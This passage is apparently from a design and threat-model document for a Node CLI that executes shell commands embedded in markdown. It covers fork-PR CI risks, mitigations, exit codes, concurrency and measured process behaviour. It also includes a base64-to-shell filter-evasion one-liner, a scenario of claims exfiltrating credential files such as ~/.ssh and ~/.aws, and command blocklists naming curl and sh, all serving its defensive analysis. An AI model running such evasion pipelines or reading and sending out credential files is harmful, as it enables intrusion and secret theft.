| S6 | **CI runs it on a PR from an untrusted fork, via `pull_request_target`** | **Critical** | The attacker's markdown executes with a **read-write** `GITHUB_TOKEN` and **full access to repository secrets**. This is total repository compromise, plus every credential in the secret store — npm publish tokens, cloud keys, signing keys. Note the acute irony: this package's own Phase 8 uses OIDC trusted publishing, so a compromised workflow with `id-token: write` could publish a malicious release of `verify-claims` itself. |
| S7 | Malicious markdown in a *transitive* dependency, plus S3 | **High** | Supply-chain reach. Combination of S3's bug with S2's trust problem. Fixed by fixing S3. |
| S8 | Claim command exfiltrates `.env`, `~/.ssh`, `~/.aws`, `~/.npmrc` | **High, and unmitigable** | Any executed command can read any file the user can. No configuration of this tool changes that. Worth stating explicitly so nobody believes an allowlist protects them. |

**S6 is the one that can end a project.** It deserves an explicit, named warning
in the README, not a general caution.

### 4.4 What a small tool cannot do — stated plainly

To keep this from drifting into theatre, here is what is **not** available:

- **Node cannot sandbox a child process.** `vm`/`vm2`/`node:vm` sandbox
  JavaScript; they are irrelevant to `sh -c`. There is no in-process boundary to
  place around `spawn`.
- **Containers, seccomp, `bwrap`, `firejail`, gVisor** are real isolation, and
  all of them are wrong here: they are platform-specific, require privileges or
  daemons the tool cannot assume, would fail in the very CI runners this targets,
  and would break the commands users actually write (`npm run build` needs the
  filesystem and usually the network). A CLI that shells out cannot ship
  isolation as a feature.
- **Static analysis of the command string** (blocking `curl`, `|`, `sh`, `rm`)
  is bypassed by `echo Y3VybCAuLi4= | base64 -d | sh`, by `$IFS`, by
  `${PATH:0:1}`, by any of a hundred encodings. Detection of malicious shell is
  undecidable in practice. Shipping it would create a **false sense of safety**,
  which is a net negative — worse than shipping nothing.
- **Network egress control** is not available to a userland Node process.

Anything proposed in these four categories should be rejected on sight.

### 4.5 Honest mitigations, ranked by real value per unit of cost

**Tier 1 — ship in v1. Cheap, effective, no downside.**

1. **Exclude `node_modules/`, `.git/`, and other dotted directories from glob
   expansion by default.** Fixes S3 and S7. This is the only scenario where the
   tool is genuinely at fault and it is a few lines of glob configuration.
   Provide no flag to re-enable it in v1; if someone truly needs it they can
   pass explicit paths.
2. **Confine resolved file paths to the cwd subtree by default.** Refuse
   `../../../etc/...` traversal out of the working directory. Cheap; closes a
   surprising-behaviour hole.
3. **`--dry-run` (or `--list`): print every claim and its exact command, run
   nothing, exit 0.** The highest-value item on this list. It converts "trust
   this repo blindly" into "read 12 lines first", it is the correct answer to
   S2, it is genuinely useful for debugging annotations, and it costs almost
   nothing to build. **It also gives untrusted-PR CI a safe mode** (see item 5).
4. **Always print the command being run, before running it.** Visibility is a
   real control. It means a malicious claim leaves an audit trail in the CI log
   even if it succeeds, and it makes S2 survivable if the user is watching.
5. **A README security section that says the true thing**, including the
   invisible-in-rich-diff property from 4.2(1), and a **CI recipe** that states:
   use `pull_request`, never `pull_request_target`; set `permissions:` to the
   minimum; and for repos that accept outside contributions, either gate the job
   on a maintainer-applied label or run `--dry-run` on fork PRs and the real
   thing only on trusted branches. This is documentation, which is weak — but it
   is the *only* control that addresses S6, because S6 is a workflow
   misconfiguration that no library code can detect or prevent.

**Tier 2 — defensible, but not v1.**

6. **Refuse to run claims in files modified by the PR** (`--skip-changed <base-ref>`).
   This is the one mitigation that actually targets the untrusted-contributor
   threat with teeth, because it means a newly-introduced malicious claim never
   executes. It is also the most interesting idea here. Against it for v1: it
   needs git integration, a base-ref resolution strategy, and correct handling of
   rebases and merge commits; and it has a bad failure mode — a legitimately
   updated claim silently stops being checked, which is the tool failing at its
   one job. Worth building later, with the skipped claims reported loudly as
   `skipped` rather than passing silently. Note that a new status value is a
   compatibility change, so if this is likely, reserve the name now.

**Tier 3 — reject, with reasons, so they don't get re-proposed.**

7. **Command allowlists.** Sound responsible; mostly are not. An allowlist of
   patterns like `npm run *` is worthless against a PR author, who also controls
   `package.json` and can redefine what `npm run lint` does. An exact-string
   allowlist in a committed config file is marginally real — but it is also
   attacker-editable in the same PR unless protected by CODEOWNERS, and nobody
   will maintain it. Net effect: complexity plus false confidence. **Reject.**
8. **Interactive confirmation before running.** Cannot work in CI, which is the
   primary target; and users will `--yes` it within a day. Prompt fatigue is a
   documented failure of this control class. **Reject** — `--dry-run` gives the
   same benefit to the people who will actually use it.
9. **Any form of sandboxing.** See 4.4. **Reject.**

### 4.6 Firm recommendation for v1

> Ship Tier 1 items 1–5. Nothing else. Accept RCE as the design. Say so on the
> first screen of the README, in plain words, including the rich-diff evasion
> property. Give the CI-on-fork-PR case its own named warning with a working
> workflow snippet. Do not ship an allowlist, a confirmation prompt, or a
> sandbox in any form.
>
> Overall severity of the package as designed: **acceptable for its stated use,
> with one sharp edge (S6) that is entirely outside the tool's control and
> therefore must be handled with unusually loud documentation.**

One additional point specific to this project: `README.md` currently frames the
security note as a single row in a risk table reading *"same trust level as
`npm run`"*. Per 4.2 that is not the whole truth. Revising it is a **pre-1.0
blocker** — a security posture stated too comfortably is itself a stale claim,
which is a bad look for this package in particular.

| ID | Setup | Expected | Why it matters |
|---|---|---|---|
| `SEC-01` | Fixture with `node_modules/some-dep/README.md` containing a claim; run `verify-claims "**/*.md"` | Claim is **not** discovered and **not** run | S3/S7. The one bug the tool owns. |
| `SEC-02` | Same, but `.git/` and a dotdir contain markdown with claims | Not discovered | Same class. |
| `SEC-03` | A markdown path resolving outside cwd via `../` | Refused, or excluded, with a clear message | Path confinement. |
| `SEC-04` | `--dry-run` over fixtures containing a command that would create a sentinel file | Every command printed; **sentinel file does not exist**; exit 0 | Proves dry-run runs nothing. Assert the side effect's absence, not just the output. |
| `SEC-05` | Normal run | Each command appears in output before its result | Auditability. |
| `SEC-06` | A claim whose command contains ANSI escapes / `\r` designed to overwrite prior report lines | Sanitised at the presentation layer; prior results remain legible | Report-integrity (2.7). Low severity, cheap to test, and it is the command controlling the tool's own output. |

---

## 5. Cross-platform

### 5.1 What actually breaks on Windows

Nearly everything this document recommends:

| Mechanism | POSIX | Windows |
|---|---|---|
| `shell: true` | `/bin/sh` | `cmd.exe` — no `&&` semantics match, different quoting, no `2>&1` in the same way, no globbing |
| `detached: true` + `process.kill(-pid)` | kills the group | **no process groups**; `-pid` is meaningless. Needs `taskkill /pid N /T /F` |
| `SIGTERM` | real signal, catchable | **not a real signal**; Node emulates `kill()` as `TerminateProcess` — no graceful shutdown, so the whole grace-period design is meaningless |
| Exit codes | 0–255 | full 32-bit range; `exit 256` is *not* truncated, so `EXIT-02` behaves differently |
| `#!/usr/bin/env node` | works | ignored; `.cmd` shims required |
| `npm run x` | `npm` | resolves to `npm.cmd`; `spawn` without `shell: true` cannot execute `.cmd` at all |
| Line endings in output | `\n` | `\r\n` — every output assertion needs normalising |
| Paths | `/` | `\`, drive letters, and `sh`-style globs in commands do not expand |
| `node_modules/.bin` | executables | `.cmd`/`.ps1` shims; `PATHEXT` matters |

This is not a compatibility layer; it is a second implementation of the
execution engine with its own test matrix.

### 5.2 Recommendation

> **v1 supports Linux and macOS. Windows is untested and undeclared.**

Specifically:

- CI matrix: `ubuntu-latest` and `macos-latest` for v1. Do **not** add
  `windows-latest` — a red CI job you have decided not to fix is worse than no
  job, and a green one you never wrote tests for is a lie.
- README: *"Tested on Linux and macOS. Windows is not tested; it may work under
  WSL or Git Bash. Reports welcome, but Windows support is not a v1 goal."*
  Honest, sets expectations, does not slam the door.
- **Do not add an `os` field to `package.json`.** `"os": ["!win32"]` makes `npm
  install` **fail** on Windows, which punishes a user whose CI happens to run on
  Windows even if they never invoke the tool. Too aggressive for a library.
- **Do not `process.exit()` early on Windows** either. Let it run; if it works,
  good. Refusing to run gains nothing.
- Guard the platform-specific parts: `process.platform === 'win32'` should at
  minimum skip the `detached`/negative-pid logic rather than throwing, because
  `process.kill(-pid)` on Windows will produce a confusing error rather than a
  clean failure.

**Deferrable honestly?** Yes. Windows support is a well-bounded later increment
(the `taskkill /T` path plus output normalisation is the bulk of it) and nothing
in v1's design forecloses it — as long as the kill logic is behind one function
rather than sprinkled through `verify`.

| ID | Setup | Expected | Why it matters |
|---|---|---|---|
| `XP-01` | All output assertions in the suite | Normalise `\r\n` → `\n` before comparing | Cheap now; makes the suite Windows-ready later at zero cost. |
| `XP-02` | The tree-kill logic | Isolated in one function with a documented platform assumption | The single seam Windows support will need. Design for it now, implement never (in v1). |
| `XP-03` | Tests using shell syntax | Only POSIX `sh`; no bash-isms, no `cmd` | See ENV-05. Keeps the suite honest about what is supported. |

---

## 6. Concurrency and scale

### 6.1 Sequential or parallel

**Measured baselines:** trivial `sh -c true` spawn costs **~2.1 ms**; a
`node -e ""` process costs **~29 ms**. Both are noise. The real cost is
whatever the command does — a real `npm run lint` is 1–5 seconds.

So for a 200-claim repo, sequential execution is roughly **200 × 2 s ≈ 7
minutes**, and process spawn overhead contributes about 0.4 seconds of that.
Parallelism at concurrency 8 would cut it to ~50 seconds. Measured
confirmation: 50 × `sleep 0.2` sequentially took 2038 ms for just 10 of them,
while 50 in parallel completed in 286 ms.

That is a real and tempting speedup. **Recommend sequential anyway**, for
reasons that are about correctness rather than difficulty:

1. **Side effects collide.** Two claims running `npm run build` concurrently
   write the same `dist/` — one may read a half-written file and fail, or worse,
   pass wrongly. `npm` operations contend on the package lock. Anything touching
   a database, a port, a temp file, or a git index races.
2. **Resource contention produces flaky verdicts.** Eight concurrent test suites
   on a 2-core CI runner will hit timeouts that have nothing to do with the
   claims. A verification tool that reports false failures under load destroys
   its own credibility — and unlike a flaky test, a false `failed` here tells a
   human to go edit correct documentation.
3. **Output attribution gets hard.** Interleaved child output makes the report
   worse exactly when it is most needed.
4. **Determinism is the product.** Two runs of the same repo should produce the
   same result. Parallelism makes that conditional on machine load.

The 7-minute figure is also less alarming than it looks, because of 6.2.

### 6.2 Command deduplication — the free win

In real usage, most claims share a handful of commands. A `CURRENT_STATE.md`
with 30 claims might reference `npm run lint`, `npm run build`, `npm test`, and
`npm run typecheck` — four distinct commands.

**Recommendation: memoise results by exact `(command, cwd)` string within a
single run.** Safe (the second run of an identical command in the same
environment during the same second is expected to give the same answer), cheap,
and it turns the 200-claim / 7-minute case into a 5-command / 10-second case.
This is a far better return than parallelism and carries none of its hazards.

Two honest caveats to document:
- It assumes commands are deterministic within a run. A command reading a
  changing clock or a remote service could differ. Acceptable — a claim whose
  verdict changes within one run is not a useful claim.
- Deduplication must be by **exact string**; do not normalise whitespace or
  attempt semantic equivalence.

Report each claim's result individually even when deduplicated, and consider
noting `(cached)` so the timing is not mysterious.

### 6.3 Ordering, partial failure, and the CLI exit code

- **Ordering:** results in a stable, deterministic order — files sorted, then
  claims in document (line) order. Never in completion order. A diffable report
  is a report you can put in CI output and compare across runs.
- **Partial failure:** on `failed` or `errored`, **continue**. The value of the
  run is the complete picture; aborting on the first failure means you fix one
  claim, re-run for 7 minutes, and find the next. Add `--bail` later if asked.
- **Tool-level failure:** if a glob matches nothing, or a file cannot be read,
  that is a *tool* problem, not a claim problem. Report it distinctly.
- **Exit code:**

| Exit | Meaning |
|---|---|
| `0` | every claim `ok` (or no claims found — but see below) |
| `1` | at least one claim `failed` or `errored` |
| `2` | the tool could not do its job (bad arguments, unreadable file, glob matched nothing) |

The `0` vs `2` line for "no claims found" is worth deciding explicitly:
**recommend exit 2** with a clear message. A glob that silently matches nothing
and reports success is the same false-green pathology as `EXIT-06`, and it will
happen the first time someone forgets to quote their glob and the shell expands
it (`docs/**/*.md` unquoted behaves very differently). Conventional, too —
`eslint` errors on unmatched patterns for the same reason.

| ID | Setup | Expected | Why it matters |
|---|---|---|---|
| `CS-01` | 3 files, 2 claims each, results collected | Deterministic order: file order then line order | Diffable reports. |
| `CS-02` | Claim 1 fails, claim 2 passes | Both reported; run does not abort | Partial failure. |
| `CS-03` | Claim 1 errors, claims 2–3 pass | All three reported | Error must not be more fatal than failure. |
| `CS-04` | 5 claims sharing 2 distinct commands | Only 2 processes spawned; 5 results returned | The dedup win. Assert the spawn count, e.g. via a sentinel-appending command. |
| `CS-05` | Same command string, different `cwd` | Not deduplicated | Cache key correctness. |
| `CS-06` | All `ok` | CLI exit 0 | The CI contract. |
| `CS-07` | Any `failed` | CLI exit 1 | The CI contract — the stated feature. |
| `CS-08` | Any `errored`, none `failed` | CLI exit **1** | The load-bearing decision from section 0. If this ever becomes 0, every typo turns into a silent pass. Highest-value test in the whole catalogue. |
| `CS-09` | Glob matches no files | CLI exit 2, clear message | Unquoted-glob footgun. |
| `CS-10` | A matched file is unreadable (`EACCES`) | Exit 2 or an `errored` entry — **decide and assert**; do not crash | Ambiguous case; pick a side deliberately. |
| `CS-11` | 200 synthetic fast claims | Completes; no fd exhaustion (`EMFILE`); memory bounded | Scale smoke test. Sequential execution makes `EMFILE` unlikely — this test documents that. |

---

## 7. Idempotence and side effects

### 7.1 The real problem

Nothing distinguishes a claim's command from any other program. `<!-- claim: npm
run build -->` writes to `dist/`. `<!-- claim: npm run migrate:status -->` is
read-only, but `<!-- claim: npm run migrate -->` is not, and they differ by six
characters. A claim can cost money (a command hitting a paid API), take twenty
minutes (a full E2E suite), or destroy data.

And this tool **encourages more of it**: the whole pitch is "attach a check to
every factual sentence", and success means many claims across many files, run
automatically in CI on every push.

The `07-decision.md` motivating example makes the stakes concrete — the
migrate-freely note was *"one step from wiping"* real records. A tool built in
response to that story should not itself be a convenient way to run a migration
200 times.

### 7.2 Should the tool warn?

**No — not heuristically.** A blocklist of `rm`, `migrate`, `deploy`, `drop`,
`publish`, `>` would be:

- **noisy**: `rm -rf dist && npm run build` is a completely normal, safe claim;
  `grep -c "drop" schema.sql` trips a substring match;
- **incomplete**: `npm run cleanup` mutates and matches nothing;
- **trivially bypassed**, and therefore not a security control at all (see 4.4);
- **and it would train users to ignore warnings**, which degrades the warnings
  that matter.

It is the same failure class as the rejected allowlist in 4.5, and it should be
rejected for the same reason: a control that is wrong often enough to be ignored
is worse than no control.

### 7.3 What to do instead

**Recommendation: handle this in documentation and in one flag, not in
heuristics.**

1. **A README section: "Choosing a good claim command."** State the property
   directly — *a good claim command is read-only, fast, and deterministic* — and
   give the contrast concretely: `npm run lint` yes; `npm run migrate` no;
   `test -f dist/index.js` yes; `npm run build` only if you accept it runs on
   every CI push. This is the highest-value item and it costs an hour.
2. **`--dry-run` already covers the "what will this do" question** (4.5 item 3).
   No new mechanism needed; it just needs mentioning in this context too.
3. **Print per-claim durations in the report.** Not a warning, just a fact. A
   claim taking 4 minutes becomes visible without the tool having to guess
   anything, and the user draws their own conclusion. Cheap, honest, no false
   positives.
4. **The timeout default is itself the backstop** against runaway cost — see
   fork D-3.

Explicitly **not** recommended for v1: a `readonly`/`safe` marker in the
annotation format. It would be the right long-term answer, but it is a
**format** change, and `07-decision.md` is correct that the format is the one
decision that must not churn. Adding an optional field before the format has
survived real use (Phase 9) is exactly the mistake that document warns against.

| ID | Setup | Expected | Why it matters |
|---|---|---|---|
| `IDEM-01` | Claim command creates a sentinel file; run twice | Sentinel created twice; tool does not detect or prevent it | Documents the accepted behaviour. Prevents a future "helpful" mutation guard from appearing without a decision. |
| `IDEM-02` | Same command in 5 claims, side-effecting | With dedup (6.2), the side effect happens **once**, not five times | A genuine and pleasant consequence of dedup that should be locked in by a test — and one users must be told about, since it means claim count does not equal execution count. |
| `IDEM-03` | A slow claim (2 s) | Duration appears in the result object and the report | The honest alternative to a warning. |
| `IDEM-04` | `--dry-run` with a side-effecting command | No side effect | Same as `SEC-04`; listed here because this is the other reason it matters. |

---

## 8. Design decisions this forces, with recommendations

Every genuine fork encountered. "Deferrable" means the v1 answer can change in
`0.x` without breaking anyone; "locked" means it is hard or breaking to change
later.

| # | Decision | Options | Recommendation for v1 | Deferrable? |
|---|---|---|---|---|
| **D-1** | Where is the `failed`/`errored` line? | (a) any non-zero = failed; (b) non-zero = failed except 126/127; (c) elaborate per-tool mapping | **(b).** Simple, defensible, one honest known mis-report (§0). Reject (c) outright — no portable convention exists. | Yes — both statuses fail CI, so moving the line changes reports, not builds. |
| **D-2** | Does `errored` fail CI? | (a) yes, exit 1; (b) no, exit 0 with a warning; (c) its own exit code | **(a).** The load-bearing decision. (b) makes every typo a silent green. (c) is unnecessary complexity — the report already distinguishes them. | **No — locked.** Changing it later breaks builds. Decide now, test it (`CS-08`). |
| **D-3** | Is there a default timeout? | (a) none; (b) 30 s; (c) 60 s; (d) 5 min | **(c), 60 s**, with `--timeout <sec>`. (a) is unacceptable: one hung claim hangs CI until the platform's blunt job timeout, wasting minutes and giving a useless error. 30 s is too short for `npm run build`; 5 min is too long to notice. 60 s is wrong for someone, hence the flag. | Yes — a number, easily tuned once real usage exists (Phase 9). |
| **D-4** | What status on timeout? | (a) `failed`; (b) `errored` | **(b).** We did not obtain a verdict. And it still fails CI, so nothing hides. | Yes. |
| **D-5** | How is the timeout enforced? | (a) Node's `timeout` option; (b) own timer + `detached` + group SIGTERM → grace → SIGKILL | **(b).** (a) is measurably broken — a TERM-ignoring process ran 8× over budget and reported **`ok`** (§2.1). This is a correctness bug, not a robustness nicety. | No — get it right immediately. |
| **D-6** | Resolve on `exit` or `close`? | (a) `close` (complete output, can hang forever); (b) `exit` + short drain (fast, may truncate trailing output) | **(b)** with a 50–100 ms drain. v1's verdict never depends on output, so liveness beats completeness (§2.2). Revisit if output-matching is ever added. | Yes, but revisit is mandatory if the rule changes. |
| **D-7** | Kill the child or the tree? | (a) `child.kill()`; (b) `detached` + `process.kill(-pid)` | **(b).** (a) provably leaves grandchildren running after the tool exits (§2.3). Also install SIGINT/SIGTERM cleanup on the tool's own process. | No. |
| **D-8** | stdin handling | (a) `'inherit'`; (b) `'pipe'`; (c) `'ignore'` | **(c).** Measured: (b) hangs on any stdin read; (a) fights for the TTY. (c) makes the whole hanging-on-input class impossible (§2.4). | No — trivial and load-bearing. |
| **D-9** | Output capture | (a) `exec`/`execFile` with `maxBuffer`; (b) `spawn` + own bounded buffer | **(b).** (a) turns a passing 2 MB-output command into an error (§2.5). Cap ~1 MiB retained per stream, keep head+tail, flag `truncated`, and **never stop reading** the pipe. | No. |
| **D-10** | Shell or argv array? | (a) `shell: true`; (b) argv array via a shell lexer | **(a).** Argv arrays offer **zero** security benefit here — the whole string is untrusted (§3.2). (b) costs a lexer and loses pipes and `&&`. Document `/bin/sh`, not bash. | Somewhat — but changing it would break users' commands, so treat as near-locked. |
| **D-11** | Who rejects empty commands? | (a) `parseClaims` only; (b) `verify` only; (c) both | **(c).** `verify` must never trust its caller — it is a public export. Whitespace-only currently exits 0 and reports **`ok`** (§1.2), and empty string throws synchronously. Both are unacceptable. | No. |
| **D-12** | Working directory | (a) markdown file's dir; (b) auto-detected repo root; (c) process cwd | **(c)**, with `--cwd`. (a) breaks the package's own canonical example. (b) is invisibly wrong in monorepos, which is the worst failure class here (§3.1). | Yes-ish — but it is user-visible behaviour, so changing it late is disruptive. |
| **D-13** | Per-claim cwd in the annotation format | (a) now; (b) defer | **(b), defer.** It is a *format* change, and `07-decision.md` is right that the format must not churn before Phase 9. (c)+per-package invocation covers the need. | Yes, deliberately. |
| **D-14** | Environment inheritance | (a) full `process.env`; (b) scrubbed allowlist | **(a).** Scrubbing has no security value (the child reads the filesystem anyway) and breaks nearly everything — measured, `env: {}` leaves no `PATH`. | Yes. |
| **D-15** | Prepend `node_modules/.bin` to PATH? | (a) yes; (b) no | **(a)**, leaning. Measured: without it, `<!-- claim: eslint . -->` gets a bare 127 despite eslint being installed (§3.3). Matches npm's own behaviour. **Weakest recommendation here** — (b) is defensible on "no magic" grounds. Whichever is chosen, pin it with `ENV-04`. | Yes, fully reversible. |
| **D-16** | Force `CI=true` / `LC_ALL=C`? | (a) yes; (b) no | **(b).** `stdio: 'ignore'` already handles interactivity; piping already disables most colour. Exit codes are locale-independent, so v1 needs no locale forcing. **Note for the future:** output-matching would make `LC_ALL=C` mandatory. | Yes. |
| **D-17** | Sequential or parallel execution? | (a) sequential; (b) parallel with a concurrency cap | **(a).** Side-effect collisions, resource contention producing false `failed`s, and non-determinism all outweigh the speedup (§6.1). | Yes — parallelism is purely additive later (behind `--concurrency`). |
| **D-18** | Deduplicate identical commands? | (a) yes, by `(command, cwd)`; (b) no | **(a).** Bigger win than parallelism with none of the hazards; turns a 200-claim run from ~7 min into seconds (§6.2). Document that side effects then happen once, not once per claim. | Yes. |
| **D-19** | Result ordering | (a) document order; (b) completion order | **(a).** Diffable reports. Free under sequential execution. | Yes. |
| **D-20** | Exit code when no claims are found | (a) 0; (b) 2 | **(b), exit 2** with a clear message. Silent success on an unmatched glob is the same false-green pathology as an empty command, and unquoted globs make it likely (§6.3). | **No — locked.** It is a CI contract. |
| **D-21** | Exclude `node_modules/` by default? | (a) yes; (b) no; (c) yes, with a flag to re-enable | **(a).** The only scenario where the tool is genuinely at fault (S3). No re-enable flag in v1 — explicit paths suffice. | No — ship in v1. |
| **D-22** | Ship a `--dry-run`? | (a) v1; (b) later | **(a), v1.** Highest security value per line of code, doubles as the answer to "will this claim mutate my repo", and gives untrusted-PR CI a safe mode (§4.5, §7.3). | No — it is small and it is the main honest mitigation. |
| **D-23** | Command allowlist / mutation blocklist / sandbox | (a) ship one; (b) reject all | **(b), reject all.** Each is bypassable, and all three manufacture false confidence, which is a net negative (§4.4, §7.2). Record the reasoning so it is not re-proposed. | N/A — a decision not to build. |
| **D-24** | `--skip-changed <base-ref>` for untrusted PRs | (a) v1; (b) later; (c) never | **(b), later.** The one mitigation with real teeth against the untrusted-contributor threat, but it needs git integration and has a bad failure mode (a legitimately updated claim silently stops being checked). If built, report skipped claims loudly. **Reserve a `skipped` status name now** — adding a status later is a compatibility change. | Yes, but reserve the name. |
| **D-25** | Windows support in v1 | (a) support and test; (b) untested, undeclared, unblocked; (c) block via `os` field | **(b).** (a) is a second execution engine (§5.1). (c) breaks `npm install` for people who never run the tool. Keep the tree-kill logic behind one function so (a) stays cheap later. | Yes, by design. |
| **D-26** | Does `verify` throw, ever? | (a) never — always resolves a result object; (b) throws on programmer error | **(a) for anything command-related**, (b) only for type violations on its own arguments — and documented. A function returning `{status}` that sometimes throws instead loses the whole run's results (§1.2). | No — it is the public API contract. |
| **D-27** | Sanitise control characters in output? | (a) at the presentation layer only; (b) in the stored result; (c) not at all | **(a).** Keep `actual` faithful; sanitise where it is printed, so the library stays honest and the CLI owns terminal safety (§2.7). | Yes. |
| **D-28** | Revise the README's security framing before 1.0 | (a) yes; (b) leave as "same trust level as `npm run`" | **(a) — pre-1.0 blocker.** The current framing omits that HTML comments are invisible in GitHub's rich diff, which is a genuine escalation over `npm run` (§4.2). A security posture stated too comfortably is itself a stale claim. | No. |

### The five that must be right on the first commit

If time is short, these are the ones where a wrong answer is either a
correctness bug or a breaking change: **D-2** (errored fails CI), **D-5**
(real timeout enforcement), **D-8** (stdin ignore), **D-11** (empty command),
**D-20** (exit 2 on no claims). Four of the five are false-green pathologies —
which is the one failure mode this package cannot afford.

---

## Appendix A — measured behaviours

Node **v22.22.2**, Linux, `/bin/sh` → dash, `spawn` with `shell: true` unless
noted. Re-measure on other platforms and Node versions before relying on any of
it.

| Observation | Result |
|---|---|
| `exit 0` / `false` / `exit 2` | code 0 / 1 / 2 |
| `exit 255` | code 255 |
| **`exit 256`** | **code 0** — truncation; false claim reads as true |
| `exit 300` | code 44 (300 & 255) |
| `exit -1` (dash) | code 2 + `Illegal number` on stderr (bash gives 255) |
| Unknown command | code 127, stderr `... not found` |
| File mode `000` | code 126, stderr `Permission denied` |
| Executable file with invalid content | code 127 (from the interpreter) |
| `''` with `shell: true` | **synchronous throw** `ERR_INVALID_ARG_VALUE` |
| `'   '` / `'# comment'` | **code 0** — reads as `ok` |
| `kill -TERM $$` | code `null`, signal `SIGTERM` |
| `kill -SEGV $$` | code `null`, signal `SIGSEGV` |
| `shell: false`, missing binary | `error` event `ENOENT` **and** `close` with code `-2` |
| `{ timeout: 500 }` vs `trap '' TERM; sleep 4` | **4007 ms**, reported `code: 0` → **`ok`** |
| Same, `killSignal: 'SIGKILL'` | 4004 ms, `signal: 'SIGKILL'` |
| `detached: true` + `process.kill(-pid,'SIGKILL')` | **503 ms** — works |
| `(sleep 3 &); echo done` | `exit` @ **4 ms**, `close` @ **3006 ms** |
| Backgrounded grandchild | survives the tool's own exit; wrote its file afterwards |
| `cat`, `stdio[0]: 'pipe'` | **hangs** (killed at 1009 ms) |
| `cat`, `stdio[0]: 'ignore'` | exits 0 in **6 ms** |
| `read -r line`, `stdio[0]: 'ignore'` | code 0, reads empty — gets EOF |
| `execFile` with 2 MB stdout | rejects `ERR_CHILD_PROCESS_STDIO_MAXBUFFER`; default cap **1048576** bytes; partial stdout retained |
| `spawn` streaming 50 MB | 259 ms, RSS 81 MB — cheap if not retained |
| Bytes `FF FE 41` decoded UTF-8 | `"��A"` — replacement chars, no throw |
| Alternating stdout/stderr writes | arrived as one stdout chunk then one stderr chunk — **relative order lost** |
| Output at `exit` vs at `close` | `"early"` vs `"early\nlate-from-orphan"` |
| `cwd` set, bare `mytool` in `node_modules/.bin` | **code 127** — `cwd` does not extend `PATH` |
| Same, with `.bin` prepended to `PATH` | code 0 |
| `env: {}` | `PATH` unset; `${PATH:0:20}` → `Bad substitution` (dash has no such expansion) |
| `echo $0` | `/bin/sh` |
| Default `LANG` / `LC_ALL` in this container | empty |
| 50 sequential `sh -c true` | 107 ms → **~2.1 ms** each |
| 10 sequential `node -e ""` | 293 ms → **~29 ms** each |
| 10 × `sleep 0.2` sequential | 2038 ms |
| 50 × `sleep 0.2` parallel | 286 ms |

---

## What this document does not cover

- The annotation format itself (Phase 2) — except where execution constrains it
  (D-13, D-24).
- Report formatting and the CLI's human-readable output (Phase 4) — except the
  exit-code contract (§6.3) and control-character sanitising (D-27).
- Output matching — explicitly out of v1 per `07-decision.md`. Flagged in three
  places (D-6, D-16, §2.7) where it would change a v1 decision, so the future
  implementer finds them.
